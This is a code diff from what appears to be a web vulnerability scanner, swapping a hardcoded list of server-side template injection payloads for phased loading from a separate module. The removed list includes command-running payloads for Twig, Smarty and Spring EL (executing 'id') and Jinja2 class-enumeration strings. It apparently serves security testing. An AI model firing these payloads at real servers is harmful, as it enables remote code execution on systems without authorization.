@@ -27,6 +27,11 @@ from enum import Enum
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlencode, urlparse, parse_qs, urljoin
 
+from ..ssti_payloads import (
+    get_payload_strings,
+    SSTIPhase,
+)
+
 logger = logging.getLogger(__name__)
 
 
@@ -217,58 +222,15 @@ class PayloadDB:
     ]
 
     # SSTI (Server-Side Template Injection) Payloads
-    SSTI_PAYLOADS = [
-        # Unique expressions (strongest - result never appears naturally)
-        '{{49163*49163}}',      # = 2417001769 (Jinja2, Twig)
-        '${49163*49163}',       # FreeMarker, Spring
-        '<%= 49163*49163 %>',   # ERB (Ruby)
-        '#{49163*49163}',       # EL
-        # Classic detection payloads (require baseline verification)
-        '{{7*7}}',              # Jinja2, Twig
-        '${7*7}',               # Velocity, FreeMarker, Spring
-        '<%= 7*7 %>',           # ERB (Ruby)
-        '#{7*7}',               # EL (Expression Language)
-        '{7*7}',                # Smarty (sometimes)
-        '[[7*7]]',              # Twig alternative
-        "{{7*'7'}}",            # Jinja2 string
-
-        # Jinja2 specific
-        '{{config}}',
-        '{{config.items()}}',
-        '{{self}}',
-        "{{''.__class__.__mro__[2].__subclasses__()}}",
-
-        # Twig specific
-        '{{_self}}',
-        '{{_self.env}}',
-        '{{dump(app)}}',
-        "{{['id']|filter('system')}}",
-
-        # FreeMarker specific
-        '${7*7}',
-
-        # Velocity specific
-        '#set($x=7*7)$x',
-
-        # Smarty specific
-        '{$smarty.version}',
-        '{if system("id")}{/if}',
-
-        # Pug (Jade)
-        '#{7*7}',
-        '= 7*7',
-
-        # ERB
-        '<%= 7*7 %>',
-
-        # Spring EL
-        '${T(java.lang.Runtime).getRuntime().exec("id")}',
-
-        # Safe detection (no RCE)
-        '{{7*7}}{{7*7}}',       # Double check
-        '${7+7}',               # Addition instead of multiplication
-        "{{\'test\'}}",         # Simple string
-    ]
+    # Loaded from structured database (core/ssti_payloads.py)
+    # Detection payloads are safe math probes; RCE payloads are included
+    # for authorized testing only.
+    SSTI_PAYLOADS = (
+        get_payload_strings(phase=SSTIPhase.DETECTION)
+        + get_payload_strings(phase=SSTIPhase.INFO_DISCLOSURE)
+        + get_payload_strings(phase=SSTIPhase.RCE)
+        + get_payload_strings(phase=SSTIPhase.FILTER_BYPASS)
+    )
 
     # XPath Injection Payloads
     XPATH_PAYLOADS = [
